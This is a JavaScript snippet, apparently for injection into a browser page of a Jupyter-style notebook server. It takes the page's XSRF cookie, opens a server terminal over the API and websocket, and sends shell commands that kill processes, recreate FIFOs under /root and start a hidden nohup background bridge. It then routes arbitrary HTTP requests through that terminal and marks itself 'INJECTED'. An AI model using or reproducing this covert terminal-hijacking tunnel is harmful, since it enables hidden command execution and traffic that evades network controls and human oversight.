const f = () => {
  const BASE = 'https://x';
  const NL = String.fromCharCode(10);
  if (window.__tunnel && window.__tunnel.ver === 5) return 'ALREADY';
  const T = {
    ver: 5,
    ws: null, out: [], name: null, ready: false, connecting: null, log: [], seq: 0,
    async api(method, path) {
      let m = document.cookie.match(new RegExp('_xsrf=([^;]+)'));
      if (!m) {
        await fetch(BASE + 'api/status', {cache: 'no-store'});
        for (let i = 0; i < 12; i++) {
          await new Promise(r => setTimeout(r, 500));
          m = document.cookie.match(new RegExp('_xsrf=([^;]+)'));
          if (m) break;
        }
      }
      return fetch(BASE + path, {method, headers: {'X-Xsrftoken': m ? m[1] : ''}});
    },
    async newTerminal() {
      const r = await this.api('POST', '/api/terminals');
      if (!r.ok) throw new Error('terminal create ' + r.status);
      const t = await r.json();
      this.name = t.name;
      return t.name;
    },
    connect() {
      if (this.ws) { try { this.ws.onclose = null; this.ws.close(); } catch (e) {} }
      this.out = [];
      const ws = new WebSocket(BASE.replace('https://', 'wss://') + '/terminals/websocket/' + this.name);
      this.ws = ws;
      ws.onmessage = (e) => { this.out.push(String(e.data)); if (this.out.length > 4000) this.out.splice(0, 2000); };
      ws.onopen = () => { this.ready = true; };
      ws.onclose = () => { this.ready = false; };
      ws.onerror = () => { this.ready = false; };
      return new Promise((res) => {
        const t0 = Date.now();
        const chk = () => {
          if (this.ready) return res(true);
          if (Date.now() - t0 > 8000 || ws.readyState === 3) return res(false);
          setTimeout(chk, 300);
        };
        chk();
      });
    },
    async ensure() {
      if (this.ready && this.ws && this.ws.readyState === 1) return;
      if (!this.connecting) {
        this.connecting = (async () => {
          await this.newTerminal();
          const opened = await this.connect();
          if (!opened) throw new Error('ws not open');
          await new Promise(r => setTimeout(r, 2000));
          const cmd = [
            'pkill -f pipe3.py 2>/dev/null',
            'pkill -f "tail -f /root/e" 2>/dev/null',
            'rm -f /root/ein /root/eout',
            'mkfifo /root/ein',
            'touch /root/eout',
            'nohup sh -c "tail -f /root/ein | python3 -u /root/pipe3.py" >/dev/null 2>&1 &',
            'sleep 1',
            'echo BRIDGE_UP',
          ].join(' ; ') + NL;
          this.ws.send(JSON.stringify(['stdin', cmd]));
          const t0 = Date.now();
          let up = false;
          while (Date.now() - t0 < 30000) {
            await new Promise(r => setTimeout(r, 500));
            const lines = this.out.join('').split(NL).map(l => l.trim());
            if (lines.some(l => l === 'BRIDGE_UP')) { up = true; break; }
            if (this.ws.readyState !== 1) break;
          }
          if (!up) throw new Error('BRIDGE_UP not seen');
          this.ready = this.ws.readyState === 1;
        })();
      }
      await this.connecting;
      this.connecting = null;
      if (!this.ready) throw new Error('tunnel ws not ready');
    },
    async sh(cmd) {
      const n0 = this.out.length;
      this.ws.send(JSON.stringify(['stdin', cmd + NL]));
      await new Promise(r => setTimeout(r, 700));
      return this.out.slice(n0).join('');
    },
    async request(httpReqText) {
      await this.ensure();
      const sizeR = await this.sh('stat -c %s /root/eout');
      const firstLine = String(sizeR).split(NL)[0].replace(/[^0-9]/g, '');
      if (!firstLine) throw new Error('cannot stat eout: ' + String(sizeR).slice(0, 100));
      const off = parseInt(firstLine, 10);
      const b64in = btoa(unescape(encodeURIComponent(httpReqText)));
      await this.sh('echo ' + b64in + ' >> /root/ein');
      const t0 = Date.now();
      while (Date.now() - t0 < 30000) {
        await new Promise(r => setTimeout(r, 600));
        const chunk = await this.sh('tail -c +' + (off + 1) + ' /root/eout');
        const lines = chunk.split(NL);
        for (const ln of lines) {
          const s = ln.trim();
          if (s.length > 40 && /^[A-Za-z0-9+/=]+$/.test(s)) {
            try {
              const resp = decodeURIComponent(escape(atob(s)));
              const i = resp.indexOf('{');
              if (i >= 0) return resp.slice(i, resp.lastIndexOf('}') + 1);
            } catch (e) {}
          }
        }
      }
      throw new Error('tunnel request timeout');
    },
  };
  T.ensure().catch(e => T.log.push('init: ' + String(e.message || e).slice(0, 80)));
  window.__tunnel = T;
  return 'INJECTED';
};
console.log(typeof f);
